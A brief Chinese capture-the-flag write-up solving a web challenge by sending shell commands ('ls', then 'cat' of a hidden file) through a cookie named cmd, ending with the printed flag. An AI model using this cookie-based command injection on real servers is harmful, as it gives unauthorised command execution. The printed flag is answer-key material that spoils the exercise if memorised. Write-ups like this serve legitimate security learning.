##非常道
##350

##我们经常把WEB服务搭建在linux服务器上，可是王老师告诉我们要逆其道而行之。

[点击我](http://script.iscc.org.cn/script04/ed9b.php)

正常访问返回：
>Let's capture flag in this level.

响应头里看到一个
>hint   cmd

直接在url后面跟了一个?cmd=ls<br>
返回：
>Do you wanna something else?<br>

然后post一个cmd过去，也是一样的返回，再然后，就改cookie：
>cmd=ls

返回：
>98ed9baeb613a0f5 ed9b.php index.php 

然后，改成
>cat 98ed9baeb613a0f5

返回：
>flag:{559baa94ce76a540e62f86a77bbe4f6c} 